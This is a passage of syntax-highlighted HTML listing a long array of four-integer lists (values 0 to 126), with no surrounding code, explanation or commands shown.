class="number">42</span>, <span class="number">12</span>, <span class="number">124</span>], [<span class="number">47</span>, <span class="number">1</span>, <span class="number">42</span>, <span class="number">47</span>], [<span class="number">28</span>, <span class="number">3</span>, <span class="number">22</span>, <span class="number">100</span>], [<span class="number">103</span>, <span class="number">105</span>, <span class="number">119</span>, <span class="number">24</span>], [<span class="number">101</span>, <span class="number">59</span>, <span class="number">13</span>, <span class="number">78</span>], [<span class="number">79</span>, <span class="number">36</span>, <span class="number">61</span>, <span class="number">54</span>], [<span class="number">11</span>, <span class="number">46</span>, <span class="number">75</span>, <span class="number">116</span>], [<span class="number">31</span>, <span class="number">73</span>, <span class="number">118</span>, <span class="number">0</span>], [<span class="number">92</span>, <span class="number">32</span>, <span class="number">0</span>, <span class="number">124</span>], [<span class="number">77</span>, <span class="number">85</span>, <span class="number">25</span>, <span class="number">90</span>], [<span class="number">29</span>, <span class="number">21</span>, <span class="number">74</span>, <span class="number">7</span>], [<span class="number">3</span>, <span class="number">66</span>, <span class="number">11</span>, <span class="number">8</span>], [<span class="number">112</span>, <span class="number">91</span>, <span class="number">50</span>, <span class="number">53</span>], [<span class="number">45</span>, <span class="number">113</span>, <span class="number">99</span>, <span class="number">123</span>], [<span class="number">35</span>, <span class="number">65</span>, <span class="number">85</span>, <span class="number">22</span>], [<span class="number">108</span>, <span class="number">99</span>, <span class="number">42</span>, <span class="number">1</span>], [<span class="number">103</span>, <span class="number">113</span>, <span class="number">116</span>, <span class="number">72</span>], [<span class="number">125</span>, <span class="number">74</span>, <span class="number">112</span>, <span class="number">24</span>], [<span class="number">75</span>, <span class="number">79</span>, <span class="number">80</span>, <span class="number">12</span>], [<span class="number">83</span>, <span class="number">44</span>, <span class="number">94</span>, <span class="number">86</span>], [<span class="number">64</span>, <span class="number">20</span>, <span class="number">0</span>, <span class="number">8</span>], [<span class="number">104</span>, <span class="number">126</span>, <span class="number">31</span>, <span class="number">120</span>], [<span class="number">85</span>, <span class="number">75</span>, <span class="number">61</span>, <span class="number">74</span>], [<span class="number">36</span>, <span class="number">93</span>, <span class="number">36</span>, <span class="number">102</span>], [<span class="number">70</span>, <span class="number">54</span>, <span class="number">101</span>, <span class="number">83</span>], [<span class="number">90</span>, <span class="number">46</span>, <span class="number">109</span>, <span class="number">83</span>], [<span class="number">112</span>, <span class="number">126</span>, <span class="number">114</span>, <span class="number">23</span>], [<span class="number">16</span>, <span class="number">123</span>, <span class="number">97</span>, <span class="number">62</span>], [<span class="number">118</span>, <span class="number">86</span>, <span class="number">108</span>, <span class="number">53</span>], [<span class="number">99</span>, <span class="number">18</span>, <span class="number">2</span>, <span class="number">18</span>], [<span class="number">103</span>, <span class="number">3</span>, <span class="number">38</span>, <span class="number">8</span>], [<span class="number">99</span>, <span class="number">49</span>, <span class="number">123</span>, <span class="number">81</span>], [<span class="number">37</span>, <span class="number">75</span>, <span class="number">89</span>, <span class="number">53</span>], [<span class="number">34</span>, <span class="number">77</span>, <span class="number">27</span>, <span class="number">122</span>], [<span class="number">29</span>, <span class="number">8</span>, <span class="number">40</span>, <span class="number">66</span>], [<span class="number">119</span>, <span class="number">13</span>, <span class="number">64</span>, <span class="number">83</span>], [<span class="number">4</span>, <span class="number">108</span>, <span class="number">116</span>, <span class="number">121</span>], [<span class="number">49</span>, <span class="number">87</span>, <span class="number">1</span>, <span class="number">92</span>], [<span class="number">15</span>, <span class="number">63</span>, <span class="number">80</span>, <span class="number">62</span>], [<span class="number">27</span>, <span class="number">81</span>, <span class="number">100</span>, <span class="number">83</span>], [<span class="number">7</span>, <span class="number">90</span>, <span class="number">16</span>, <span class="number">0</span>], [<span class="number">13</span>, <span class="number">50</span>, <span class="number">61</span>, <span class="number">65</span>], [<span class="number">51</span>, <span class="number">64</span>, <span class="number">76</span>, <span class="number">5</span>], [<span class="number">55</span>, <span class="number">100</span>, <span class="number">106</span>, <span class="number">66</span>], [<span class="number">52</span>, <span class="number">102</span>, <span class="number">105</span>, <span class="number">2</span>], [<span class="number">49</span>, <span class="number">34</span>, <span class="number">89</span>, <span class="number">116</span>], [<span class="number">24</span>, <span class="number">55</span>, <span class="number">11</span>, <span class="number">27</span>], [<span class="number">91</span>, <span class="number">48</span>, <span class="number">73</span>, <span class="number">38</span>], [<span class="number">27</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">126</span>], [<span class="number">66</span>, <span class="number">55</span>, <span class="number">80</span>, <span class="number">19</span>], [<span class="number">52</span>, <span class="number">118</span>, <span class="number">104</span>, <span class="number">43</span>], [<span class="number">36</span>, <span class="number">1</span>, <span class="number">111</span>, <span class="number">60</span>], [<span class="number">65</span>, <span class="number">4</span>, <span class="number">34</span>, <span class="number">17</span>], [<span class="number">54</span>, <span class="number">22</span>, <span class="number">0</span>, <span class="number">39</span>], [<span class="number">52</span>, <span class="number">30</span>, <span class="number">64</span>, <span class="number">62</span>], [<span class="number">26</span>, <span class="number">40</span>, <span class="number">32</span>, <span class="number">86</span>], [<span class="number">93</span>, <span class="number">71</span>, <span class="number">41</span>, <span class="number">47</span>], [<span class="number">77</span>, <span class="number">23</span>, <span class="number">15</span>, <span class="number">9</span>], [<span class="number">11</span>, <span class="number">20</span>, <span class="number">51</span>, <span class="number">31</span>], [<span class="number">64</span>, <span class="number">50</span>, <span class="number">37</span>, <span class="number">50</span>], [<span class="number">17</span>, <span class="number">49</span>, <span class="number">80</span>, <span class="number">37</span>], [<span class="number">119</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">50</span>], [<span class="number">20</span>, <span class="number">86</span>, <span class="number">27</span>, <span class="number">5</span>], [<span class="number">101</span>, <span class="number">65</span>, <span class="number">17</span>, <span class="number">78</span>], [<span class="number">56</span>, <span class="number">25</span>, <span class="number">125</span>, <span class="number">56</span>], [<span class="number">16</span>, <span class="number">118</span>, <span class="number">2</span>, <span class="number">96</span>], [<span class="number">114</span>, <span class="number">108</span>, <span class="number">69</span>, <span class="number">121</span>], [<span class="number">14</span>, <span class="number">37</span>, <span class="number">76</span>, <span class="number">101</span>], [<span class="number">113</span>, <span class="number">124</span>, <span class="number">121</span>, <span class="number">82</span>], [<span class="number">43</span>, <span class="number">120</span>, <span class="number">35</span>, <span class="number">94</span>], [<span class="number">82</span>, <span class="number">67</span>, <span class="number">23</span>, <span class="number">43</span>], [<span class="number">9</span>, <span class="number">79</span>, <span class="number">47</span>, <span class="number">122</span>], [<span class="number">39</span>, <span class="number">28</span>, <span class="number">110</span>, <span class="number">31</span>], [<span class="number">35</span>, <span class="number">48</span>, <span class="number">27</span>, <span class="number">16</span>], [<span class="number">72</span>, <span class="number">8</span>, <span class="number">115</span>, <span class="number">66</span>], [<span class="number">54</span>, <span class="number">46</span>, <span class="number">122</span>, <span class="number">19</span>], [<span class="number">77</span>, <span class="number">77</span>, <span class="number">30</span>, <span class="number">74</span>], [<span class="number">58</span>, <span class="number">63</span>, <span class="number">81</span>, <span class="number">96</span>], [<span class="number">6</span>, <span class="number">122</span>, <span class="number">75</span>, <span class="number">63</span>], [<span class="number">115</span>, <span class="number">31</span>, <span class="number">119</span>, <span class="number">110</span>], [<span class="number">82</span>, <span class="number">86</span>, <span class="number">89</span>, <span class="number">1</span>], [<span class="number">79</span>, <span class="number">100</span>, <span class="number">6</span>, <span class="number">110</span>], [<span class="number">117</span>, <span class="number">67</span>, <span class="number">15</span>, <span class="number">13</span>], [<span class="number">4</span>, <span class="number">15</span>, <span class="number">63</span>, <span class="number">0</span>], [<span class="number">106</span>, <span class="number">108</span>, <span class="number">122</span>, <span class="number">107</span>], [<span class="number">34</span>, <span class="number">72</span>, <span class="number">0</span>, <span class="number">114</span>], [<span class="number">20</span>, <span class="number">0</span>, <span class="number">32</span>, <span class="number">56</span>], [<span class="number">121</span>, <span class="number">104</span>, <span class="number">66</span>, <span class="number">3</span>], [<span class="number">86</span>, <span class="number">28</span>, <span class="number">76</span>, <span class="number">84</span>], [<span class="number">85</span>, <span class="number">9</span>, <span class="number">60</span>, <span class="number">45</span>], [<span class="number">95</span>, <span class="number">80</span>, <span class="number">78</span>, <span class="number">65</span>], [<span class="number">39</span>, <span class="number">85</span>, <span class="number">50</span>, <span class="number">49</span>], [<span class="number">42</span>, <span class="number">103</span>, <span class="number">36</span>, <span class="number">90</span>], [<span class="number">70</span>, <span class="number">99</span>, <span class="number">116</span>, <span class="number">117</span>], [<span class="number">34</span>, <span class="number">15</span>, <span class="number">40</span>, <span class="number">52</span>], [<span class="number">24</span>, <span class="number">49</span>, <span class="number">19</span>, <span class="number">31</span>], [<span class="number">98</span>, <span class="number">90</span>, <span class="number">95</span>, <span class="number">89</span>], [<span class="number">63</span>, <span class="number">45</span>, <span class="number">40</span>, <span class="number">77</span>], [<span class="number">114</span>, <span class="number">14</span>, <span class="number">30</span>, <span class="number">106</span>], [<span class="number">10</span>, <span class="number">35</span>, <span class="number">116</span>, <span class="number">9</span>], [<span class="number">103</span>, <span class="number">111</span>, <span class="number">112</span>, <span class="number">16</span>], [<span class="number">71</span>, <span class="number">112</span>, <span class="number">71</span>, <span class="number">32</span>], [<span class="number">77</span>, <span class="number">31</span>, <span class="number">105</span>, <span class="number">64</span>], [<span class="number">84</span>, <span class="number">87</span>, <span class="number">24</span>, <span class="number">67</span>], [<span class="number">1</span>, <span class="number">27</span>, <span class="number">123</span>, <span class="number">57</span>], [<span class="number">104</span>, <span class="number">29</span>, <span class="number">87</span>, <span class="number">123</span>], [<span class="number">110</span>, <span class="number">39</span>, <span class="number">67</span>, <span class="number">7</span>], [<span class="number">28</span>, <span class="number">70</span>, <span class="number">108</span>, <span class="number">113</span>], [<span class="number">96</span>, <span class="number">9</span>, <span class="number">101</span>, <span class="number">36</span>], [<span class="number">13</span>, <span class="number">28</span>, <span class="number">6</span>, <span class="number">13</span>], [<span class="number">69</span>, <span class="number">81</span>, <span class="number">89</span>, <span class="number">26</span>], [<span class="number">79</span>, <span class="number">113</span>, <span class="number">77</span>, <span class="number">91</span>], [<span class="number">112</span>, <span class="number">62</span>, <span class="number">104</span>, <span class="number">117</span>], [<span class="number">109</span>, <span class="number">95</span>, <span class="number">55</span>, <span class="number">83</span>], [<span class="number">78</span>, <span class="number">68</span>, <span class="number">98</span>, <span class="number">14</span>], [<span class="number">73</span>, <span class="number">79</span>, <span class="number">96</span>, <span class="number">12</span>], [<span class="number">108</span>, <span class="number">39</span>, <span class="number">97</span>, <span class="number">49</span>], [<span class="number">27</span>, <span class="number">111</span>, <span class="number">106</span>, <span class="number">100</span>], [<span class="number">82</span>, <span class="number">70</span>, <span class="number">9</span>, <span class="number">36</span>], [<span class="number">48</span>, <span class="number">31</span>, <span class="number">90</span>, <span class="number">70</span>], [<span class="number">99</span>, <span class="number">92</span>, <span class="number">45</span>, <span class="number">35</span>], [<span class="number">55</span>, <span class="number">100</span>, <span class="number">31</span>, <span class="number">37</span>], [<span class="number">75</span>, <span class="number">17</span>, <span class="number">69</span>, <span class="number">35</span>], [<span class="number">12</span>, <span class="number">38</span>, <span class="number">119</span>, <span class="number">112</span>], [<span class="number">103</span>, <span class="number">34</span>, <span class="number">63</span>, <span class="number">76</span>], [<span class="number">26</span>, <span class="number">19</span>, <span class="number">91</span>, <span class="number">111</span>], [<span class="number">74</span>, <span class="number">122</span>, <span class="number">12</span>, <span class="number">78</span>], [<span class="number">64</span>, <span class="number">117</span>, <span class="number">16</span>, <span class="number">60</span>], [<span class="number">2</span>, <span class="number">97</span>, <span class="number">122</span>, <span class="number">106</span>], [<span class="number">62</span>, <span class="number">79</span>, <span class="number">56</span>, <span class="number">30</span>], [<span class="number">71</span>, <span class="number">47</span>, <span class="number">13</span>, <span class="number">22</span>], [<span class="number">38</span>, <span class="number">78</span>, <span class="number">116</span>, <span class="number">16</span>], [<span class="number">87</span>, <span class="number">28</span>, <span class="number">94</span>, <span class="number">76</span>], [<span class="number">77</span>, <span class="number">126</span>, <span class="number">94</span>, <span class="number">116</span>], [<span class="number">83</span>, <span class="number">46</span>, <span class="number">104</span>, <span class="number">90</span>], [<span class="number">5</span>, <span class="number">95</span>, <span class="number">13</span>, <span class="number">26</span>], [<span class="number">47</span>, <span class="number">10</span>, <span class="number">46</span>, <span class="number">115</span>], [<span class="number">82</span>, <span class="number">19</span>, <span class="number">91</span>, <span class="number">70</span>], [<span class="number">111</span>, <span class="number">72</span>, <span class="number">49</span>, <span class="number">65</span>], [<span class="number">18</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">72</span>], [<span class="number">17</span>, <span class="number">37</span>, <span class="number">56</span>, <span class="number">24</span>], [<span class="number">19</span>, <span class="number">120</span>, <span class="number">24</span>, <span class="number">64</span>], [<span class="number">28</span>, <span class="number">40</span>, <span class="number">11</span>, <span class="number">20</span>], [<span class="number">18</span>, <span class="number">19</span>, <span class="number">80</span>, <span class="number">62</span>], [<span class="number">37</span>, <span class="number">11</span>, <span class="number">74</span>, <span class="number">14</span>], [<span class="number">109</span>, <span class="number">97</span>, <span class="number">75</span>, <span class="number">72</span>], [<span class="number">116</span>, <span class="number">65</span>, <span class="number">52</span>, <span class="number">121</span>], [<span class="number">95</span>, <span class="number">63</span>, <span class="number">82</span>, <span class="number">122</span>], [<span class="number">88</span>, <span class="number">93</span>, <span class="number">54</span>, <span class="number">93</span>], [<span class="number">77</span>, <span class="number">30</span>, <span class="number">65</span>, <span class="number">121</span>], [<span class="number">99</span>, <span class="number">121</span>, <span class="number">42</span>, <span class="number">87</span>], [<span class="number">62</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">6</span>], [<span class="number">79</span>, <span class="number">60</span>, <span class="number">55</span>, <span class="number">4</span>], [<span class="number">96</span>, <span class="number">64</span>, <span class="number">6</span>, <span class="number">20</span>], [<span class="number">94</span>, <span class="number">114</span>, <span class="number">90</span>, <span class="number">8</span>], [<span class="number">123</span>, <span class="number">98</span>, <span class="number">29</span>, <span class="number">27</span>], [<span class="number">116</span>, <span class="number">84</span>, <span class="number">31</span>, <span class="number">80</span>], [<span class="number">9</span>, <span class="number">77</span>, <span class="number">45</span>, <span class="number">45</span>], [<span class="number">120</span>, <span class="number">33</span>, <span class="number">63</span>, <span class="number">15</span>], [<span class="number">51</span>, <span class="number">44</span>, <span class="number">66</span>, <span class="number">25</span>], [<span class="number">2</span>, <span class="number">46</span>, <span class="number">72</span>, <span class="number">94</span>], [<span class="number">107</span>, <span class="number">113</span>, <span class="number">50</span>, <span class="number">46</span>], [<span class="number">115</span>, <span class="number">64</span>, <span class="number">126</span>, <span class="number">85</span>], [<span class="number">64</span>, <span class="number">10</span>, <span class="number">28</span>, <span class="number">78</span>], [<span class="number">84</span>, <span class="number">112</span>, <span class="number">64</span>, <span class="number">103</span>], [<span class="number">59</span>, <span class="number">114</span>, <span class="number">15</span>, <span class="number">82</span>], [<span class="number">65</span>, <span class="number">122</span>, <span class="number">104</span>, <span class="number">89</span>], [<span class="number">113</span>, <span class="number">122</span>, <span class="number">21</span>, <span class="number">11</span>], [<span class="number">69</span>, <span class="number">106</span>, <span class="number">19</span>, <span class="number">78</span>], [<span class="number">42</span>, <span class="number">93</span>, <span class="number">125</span>, <span class="number">0</span>], [<span class="number">7</span>, <span class="number">123</span>, <span class="number">82</span>, <span class="number">70</span>], [<span class="number">103</span>, <span class="number">114</span>, <span class="number">62</span>, <span class="number">92</span>], [<span class="number">15</span>, <span class="number">30</span>, <span class="number">78</span>, <span class="number">114</span>], [<span class="number">4</span>, <span class="number">78</span>, <span class="number">111</span>, <span class="number">60</span>], [<span class="number">40</span>, <span class="number">80</span>, <span class="number">34</span>, <span class="number">55</span>], [<span class="number">3</span>, <span class="number">87</span>, <span class="number">120</span>, <span class="number">27</span>], [<span class="number">122</span>, <span class="number">64</span>, <span class="number">3</span>, <span class="number">122</span>], [<span class="number">24</span>, <span class="number">49</span>, <span class="number">31</span>, <span class="number">81</span>], [<span class="number">26</span>, <span class="number">43</span>, <span class="number">100</span>, <span class="number">19</span>], [<span class="number">52</span>, <span class="number">78</span>, <span class="number">2</span>, <span class="number">97</span>], [<span class="number">116</span>, <span class="number">45</span>, <span class="number">15</span>, <span class="number">33</span>], [<span class="number">21</span>, <span class="number">119</span>, <span class="number">92</span>, <span class="number">86</span>], [<span class="number">28</span>, <span class="number">118</span>, <span class="number">71</span>, <span class="number">24</span>], [<span class="number">106</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">79</span>], [<span class="number">36</span>, <span class="number">4</span>, <span class="number">52</span>, <span class="number">73</span>], [<span class="number">22</span>, <span class="number">43</span>, <span class="number">8</span>, <span class="number">60</span>], [<span class="number">96</span>, <span class="number">22</span>, <span class="number">9</span>, <span class="number">100</span>], [<span class="number">19</span>, <span class="number">64</span>, <span class="number">26</span>, <span class="number">96</span>], [<span class="number">97</span>, <span class="number">61</span>, <span class="number">22</span>, <span class="number">39</span>], [<span class="number">6</span>, <span class="number">112</span>, <span class="number">76</span>, <span class="number">38</span>], [<span class="number">58</span>, <span class="number">6</span>, <span class="number">97</span>, <span class="number">94</span>], [<span class="number">103</span>, <span class="number">87</span>, <span class="number">87</span>, <span class="number">101</span>], [<span class="number">17</span>, <span class="number">49</span>, <span class="number">80</span>, <span class="number">37</span>], [<span class="number">117</span>, <span class="number">33</span>, <span class="number">26</span>, <span class="number">8</span>], [<span class="number">59</span>, <span class="number">108</span>, <span class="number">78</span>, <span class="number">91</span>], [<span class="number">113</span>, <span class="number">28</span>, <span class="number">30</span>, <span class="number">44</span>], [<span class="number">119</span>, <span class="number">78</span>, <span class="number">72</span>, <span class="number">20</span>], [<span class="number">49</span>, <span class="number">101</span>, <span class="number">77</span>, <span class="number">2</span>], [<span class="number">26</span>, <span class="number">18</span>, <span class="number">35</span>, <span class="number">7</span>], [<span class="number">34</span>, <span class="number">38</span>, <span class="number">99</span>, <span class="number">37</span>], [<span class="number">45</span>, <span class="number">52</span>, <span class="number">90</span>, <span class="number">27</span>], [<span class="number">108</span>, <span class="number">31</span>, <span class="number">118</span>, <span class="number">67</span>], [<span class="number">3</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">88</span>], [<span class="number">111</span>, <span class="number">96</span>, <span class="number">12</span>, <span class="number">111</span>], [<span class="number">91</span>, <span class="number">111</span>, <span class="number">106</span>, <span class="number">100</span>], [<span class="number">52</span>, <span class="number">78</span>, <span class="number">117</span>, <span class="number">80</span>], [<span class="number">14</span>, <span class="number">51</span>, <span class="number">87</span>, <span class="number">0</span>], [<span class="number">1</span>, <span class="number">52</span>, <span class="number">116</span>, <span class="number">1</span>], [<span class="number">117</span>, <span class="number">2</span>, <span class="number">33</span>, <span class="number">48</span>], [<span class="number">57</span>, <span class="number">0</span>, <span class="number">48</span>, <span class="number">34</span>], [<span class="number">59</span>, <span class="number">14</span>, <span class="number">84</span>, <span class="number">63</span>], [<span class="number">82</span>, <span class="number">83</span>, <span class="number">8</span>, <span class="number">82</span>], [<span class="number">58</span>, <span class="number">100</span>, <span class="number">32</span>, <span class="number">33</span>], [<span class="number">75</span>, <span class="number">29</span>, <span class="number">112</span>, <span class="number">103</span>], [<span class="number">0</span>, <span class="number">49</span>, <span class="number">45</span>, <span class="number">54</span>], [<span class="number">94</span>, <span class="number">9</span>, <span class="number">51</span>, <span class="number">110</span>], [<span class="number">54</span>, <span class="number">61</span>, <span class="number">27</span>, <span class="number">47</span>], [<span class="number">88</span>, <span class="number">89</span>, <span class="number">23</span>, <span class="number">37</span>], [<span class="number">73</span>, <span class="number">43</span>, <span class="number">0</span>, <span class="number">32</span>], [<span class="number">123</span>, <span class="number">6</span>, <span class="number">35</span>, <span class="number">78</span>], [<span class="number">73</span>, <span class="number">72</span>, <span class="number">119</span>, <span class="number">64</span>], [<span class="number">81</span>, <span class="number">46</span>, <span class="number">11</span>, <span class="number">102</span>], [<span class="number">42</span>, <span class="number">124</span>, <span class="number">47</span>, <span class="number">8</span>], [<span class="number">50</span>, <span class="number">66</span>, <span class="number">3</span>, <span class="number">40</span>], [<span class="number">116</span>, <span class="number">7</span>, <span class="number">51</span>, <span class="number">20</span>], [<span class="number">47</span>, <span class="number">112</span>, <span class="number">99</span>, <span class="number">7</span>], [<span class="number">42</span>, <span class="number">37</span>, <span class="number">86</span>, <span class="number">89</span>], [<span class="number">18</span>, <span class="number">74</span>, <span class="number">78</span>, <span class="number">101</span>], [<span class="number">57</span>, <span class="number">85</span>, <span class="number">75</span>, <span class="number">7</span>], [<span class="number">26</span>, <span class="number">90</span>, <span class="number">35</span>, <span class="number">10</span>], [<span class="number">72</span>, <span class="number">126</span>, <span class="number">10</span>, <span class="number">77</span>], [<span class="number">55</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">78</span>], [<span class="number">37</span>, <span class="number">87</span>, <span class="number">85</span>, <span class="number">96</span>], [<span class="number">91</span>, <span class="number">9</span>, <span class="number">114</span>, <span class="number">68</span>], [<span class="number">79</span>, <span class="number">76</span>, <span class="number">44</span>, <span class="number">20</span>], [<span class="number">84</span>, <span class="number">52</span>, <span class="number">63</span>, <span class="number">56</span>], [<span class="number">95</span>, <span class="number">9</span>, <span class="number">22</span>, <span class="number">117</span>], [<span class="number">96</span>, <span class="number">38</span>, <span class="number">50</span>, <span class="number">67</span>], [<span class="number">43</span>, <span class="number">114</span>, <span class="number">45</span>, <span class="number">56</span>], [<span class="number">94</span>, <span class="number">21</span>, <span class="number">74</span>, <span class="number">107</span>], [<span class="number">92</span>, <span class="number">82</span>, <span class="number">81</span>, <span class="number">71</span>], [<span class="number">40</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">90</span>], [<span class="number">20</span>, <span class="number">18</span>, <span class="number">15</span>, <span class="number">56</span>], [<span class="number">72</span>, <span class="number">2</span>, <span class="number">30</span>, <span class="number">22</span>], [<span class="number">50</span>, <span class="number">31</span>, <span class="number">123</span>, <span class="number">20</span>], [<span class="number">85</span>, <span class="number">40</span>, <span class="number">115</span>, <span class="number">115</span>], [<span class="number">93</span>, <span class="number">1</span>, <span class="number">48</span>, <span class="number">47</span>], [<span class="number">111</span>, <span class="number">118</span>, <span class="number">45</span>, <span class="number">34</span>], [<span class="number">9</span>, <span class="number">122</span>, <span class="number">37</span>, <span class="number">121</span>], [<span class="number">60</span>, <span class="number">27</span>, <span class="number">77</span>, <span class="number">41</span>], [<span class="number">122</span>, <span class="number">38</span>, <span class="number">22</span>, <span class="number">39</span>], [<span class="number">115</span>, <span class="number">66</span>, <span class="number">74</span>, <span class="number">126</span>], [<span class="number">77</span>, <span class="number">67</span>, <span class="number">90</span>, <span class="number">78</span>], [<span class="number">96</span>, <span class="number">3</span>, <span class="number">53</span>, <span class="number">52</span>], [<span class="number">5</span>, <span class="number">26</span>, <span class="number">120</span>, <span class="number">101</span>], [<span class="number">45</span>, <span class="number">100</span>, <span class="number">72</span>, <span class="number">6</span>], [<span class="number">106</span>, <span class="number">56</span>, <span class="number">87</span>, <span class="number">77</span>], [<span class="number">52</span>, <span class="number">68</span>, <span class="number">102</span>, <span class="number">95</span>], [<span class="number">1</span>, <span class="number">13</span>, <span class="number">36</span>, <span class="number">33</span>], [<span class="number">58</span>, <span class="number">27</span>, <span class="number">35</span>, <span class="number">8</span>], [<span class="number">52</span>, <span class="number">5</span>, <span class="number">38</span>, <span class="number">35</span>], [<span class="number">102</span>, <span class="number">82</span>, <span class="number">63</span>, <span class="number">47</span>], [<span class="number">24</span>, <span class="number">71</span>, <span class="number">119</span>, <span class="number">43</span>], [<span class="number">11</span>, <span class="number">36</span>, <span class="number">90</span>, <span class="number">13</span>], [<span class="number">11</span>, <span class="number">93</span>, <span class="number">27</span>, <span class="number">23</span>], [<span class="number">4</span>, <span class="number">107</span>, <span class="number">26</span>, <span class="number">125</span>], [<span class="number">85</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">13</span>], [<span class="number">116</span>, <span class="number">25</span>, <span class="number">55</span>, <span class="number">119</span>], [<span class="number">73</span>, <span class="number">82</span>, <span class="number">73</span>, <span class="number">2</span>], [<span class="number">40</span>, <span class="number">123</span>, <span class="number">77</span>, <span class="number">41</span>], [<span class="number">10</span>, <span class="number">98</span>, <span class="number">51</span>, <span class="number">111</span>], [<span class="number">23</span>, <span class="number">79</span>, <span class="number">120</span>, <span class="number">54</span>], [<span class="number">56</span>, <span class="number">18</span>, <span class="number">22</span>, <span class="number">84</span>], [<span class="number">61</span>, <span class="number">115</span>, <span class="number">51</span>, <span class="number">109</span>], [<span class="number">33</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">121</span>], [<span class="number">8</span>, <span class="number">81</span>, <span class="number">35</span>, <span class="number">70</span>], [<span class="number">22</span>, <span class="number">39</span>, <span class="number">103</span>, <span class="number">2</span>], [<span class="number">38</span>, <span class="number">74</span>, <span class="number">66</span>, <span class="number">126</span>], [<span class="number">83</span>, <span class="number">20</span>, <span class="number">117</span>, <span class="number">85</span>], [<span class="number">8</span>, <span class="number">32</span>, <span class="number">91</span>, <span class="number">98</span>], [<span class="number">37</span>, <span class="number">31</span>, <span class="number">94</span>, <span class="number">119</span>], [<span class="number">7</span>, <span class="number">30</span>, <span class="number">45</span>, <span class="number">43</span>], [<span class="number">68</span>, <span class="number">16</span>, <span class="number">124</span>, <span class="number">97</span>], [<span class="number">86</span>, <span class="number">124</span>, <span class="number">37</span>, <span class="number">21</span>], [<span class="number">29</span>, <span class="number">101</span>, <span class="number">15</span>, <span class="number">30</span>], [<span class="number">27</span>, <span class="number">31</span>, <span class="number">52</span>, <span class="number">45</span>], [<span class="number">47</span>, <span class="number">37</span>, <span class="number">102</span>, <span class="number">3</span>], [<span class="number">117</span>, <span class="number">49</span>, <span class="number">54</span>, <span class="number">89</span>], [<span class="number">48</span>, <span class="number">94</span>, <span class="number">126</span>, <span class="number">66</span>], [<span class="number">42</span>, <span class="number">115</span>, <span class="number">63</span>, <span class="number">104</span>], [<span class="number">14</span>, <span class="number">74</span>, <span class="number">6</span>, <span class="number">112</span>], [<span class="number">68</span>, <span class="number">125</span>, <span class="number">4</span>, <span class="number">5</span>], [<span class="number">66</span>, <span class="number">3</span>, <span class="number">78</span>, <span class="number">52</span>], [<span class="number">108</span>, <span class="number">33</span>, <span class="number">6</span>, <span class="number">77</span>], [<span class="number">77</span>, <span class="number">99</span>, <span class="number">16</span>, <span class="number">52</span>], [<span class="number">61</span>, <span class="number">78</span>, <span class="number">73</span>, <span class="number">70</span>], [<span class="number">108</span>, <span class="number">106</span>, <span class="number">124</span>, <span class="number">0</span>], [<span class="number">23</span>, <span class="number">35</span>, <span class="number">119</span>, <span class="number">118</span>], [<span class="number">125</span>, <span class="number">124</span>, <span class="number">37</span>, <span class="number">65</span>], [<span class="number">69</span>, <span class="number">30</span>, <span class="number">61</span>, <span class="number">110</span>], [<span class="number">77</span>, <span class="number">10</span>, <span class="number">120</span>, <span class="number">118</span>], [<span class="number">53</span>, <span class="number">121</span>, <span class="number">24</span>, <span class="number">30</span>], [<span class="number">87</span>, <span class="number">32</span>, <span class="number">29</span>, <span class="number">63</span>], [<span class="number">54</span>, <span class="number">64</span>, <span class="number">1</span>, <span class="number">3</span>], [<span class="number">16</span>, <span class="number">59</span>, <span class="number">104</span>, <span class="number">25</span>], [<span class="number">30</span>, <span class="number">6</span>, <span class="number">59</span>, <span class="number">102</span>], [<span class="number">43</span>, <span class="number">120</span>, <span class="number">35</span>, <span class="number">94</span>], [<span class="number">89</span>, <span class="number">13</span>, <span class="number">69</span>, <span class="number">39</span>], [<span class="number">87</span>, <span class="number">78</span>, <span class="number">100</span>, <span class="number">14</span>], [<span class="number">83</span>, <span class="number">17</span>, <span class="number">14</span>, <span class="number">4</span>], [<span class="number">24</span>, <span class="number">49</span>, <span class="number">31</span>, <span class="number">81</span>], [<span class="number">73</span>, <span class="number">32</span>, <span class="number">72</span>, <span class="number">10</span>], [<span class="number">0</span>, <span class="number">22</span>, <span class="number">61</span>, <span class="number">54</span>], [<span class="number">81</span>, <span class="number">42</span>, <span class="number">70</span>, <span class="number">13</span>], [<span class="number">108</span>, <span class="number">56</span>, <span class="number">52</span>, <span class="number">2</span>], [<span class="number">25</span>, <span class="number">99</span>, <span class="number">116</span>, <span class="number">72</span>], [<span class="number">66</span>, <span class="number">23</span>, <span class="number">18</span>, <span class="number">102</span>], [<span class="number">121</span>, <span class="number">115</span>, <span class="number">47</span>, <span class="number">12</span>], [<span class="number">96</span>, <span class="number">37</span>, <span class="number">123</span>, <span class="number">48</span>], [<span class="number">64</span>, <span class="number">69</span>, <span class="number">4</span>, <span class="number">39</span>], [<span class="number">78</span>, <span class="number">38</span>, <span class="number">124</span>, <span class="number">31</span>], [<span class="number">27</span>, <span class="number">69</span>, <span class="number">10</span>, <span class="number">70</span>], [<span class="number">5</span>, <span class="number">29</span>, <span class="number">2</span>, <span class="number">85</span>], [<span class="number">30</span>, <span class="number">45</span>, <span class="number">56</span>, <span class="number">7</span>], [<span class="number">31</span>, <span class="number">25</span>, <span class="number">120</span>, <span class="number">61</span>], [<span class="number">36</span>, <span class="number">89</span>, <span class="number">89</span>, <span class="number">118</span>], [<span class="number">98</span>, <span class="number">63</span>, <span class="number">18</span>, <span class="number">21</span>], [<span class="number">121</span>, <span class="number">83</span>, <span class="number">36</span>, <span class="number">57</span>], [<span class="number">60</span>, <span class="number">5</span>, <span class="number">86</span>, <span class="number">17</span>], [<span class="number">121</span>, <span class="number">55</span>, <span class="number">117</span>, <span class="number">58</span>], [<span class="number">12</span>, <span class="number">96</span>, <span class="number">4</span>, <span class="number">27</span>], [<span class="number">119</span>, <span class="number">63</span>, <span class="number">124</span>, <span class="number">37</span>], [<span class="number">96</span>, <span class="number">27</span>, <span class="number">45</span>, <span class="number">91</span>], [<span class="number">42</span>, <span class="number">119</span>, <span 